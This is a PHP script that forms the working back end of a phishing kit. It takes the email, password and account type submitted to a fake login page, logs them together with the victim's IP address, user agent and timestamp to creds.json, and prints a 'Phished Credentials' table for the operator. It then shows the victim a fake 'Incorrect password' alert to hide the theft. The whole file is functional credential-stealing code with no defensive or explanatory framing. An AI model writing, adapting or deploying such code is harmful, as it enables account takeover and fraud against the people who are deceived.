<?php
// Get POST data
$email = $_POST['email'] ?? '';
$pass = $_POST['pass'] ?? '';
$type = $_POST['type'] ?? '';

// Get client IP
function getClientIP() {
    $ipKeys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim($ipList[0]);
        }
    }
    return 'UNKNOWN';
}
$ip = getClientIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$timestamp = date('Y-m-d H:i:s');

// Prepare the data
$data = [
    'email' => $email,
    'password' => $pass,
    'type' => $type,
    'ip' => $ip,
    'user_agent' => $userAgent,
    'timestamp' => $timestamp
];

// Save to creds.json
$file = 'creds.json';
$entries = [];

if (file_exists($file)) {
    $json = file_get_contents($file);
    $entries = json_decode($json, true);
    if (!is_array($entries)) $entries = [];
}
$entries[] = $data;
file_put_contents($file, json_encode($entries, JSON_PRETTY_PRINT));

// Terminal Color Codes
$yellow = "\033[1;33m";
$cyan = "\033[1;36m";
$green = "\033[1;32m";
$red = "\033[1;31m";
$reset = "\033[0m";

// Build the table output
$line = "+---------------------+-------------------------------+\n";
$table = "\n" .

    $line .
    "|               🎯 Phished Credentials                |\n" .
    $line .
    "| Email              | " . str_pad($email, 30) . "|\n" .
    "| Password           | " . str_pad($pass, 30) . "|\n" .
    "| Type               | " . str_pad($type, 30) . "|\n" .
    "| IP Address         | " . str_pad($ip, 30) . "|\n" .
    "| User-Agent         | " . str_pad(substr($userAgent, 0, 30), 30) . "|\n" .
    "| Timestamp          | " . str_pad($timestamp, 30) . "|\n" .
    $line;

// Detect environment and print accordingly
if (php_sapi_name() === 'cli') {
    // If running in CLI
    echo $table;
} else {
    // If running in web server
    error_log(strip_tags($table)); // Logging without color codes
}

// Send fake error back to frontend
echo "<script>
    alert('❌ Incorrect password. Please try again.');
    window.history.back();
</script>";
exit;
?>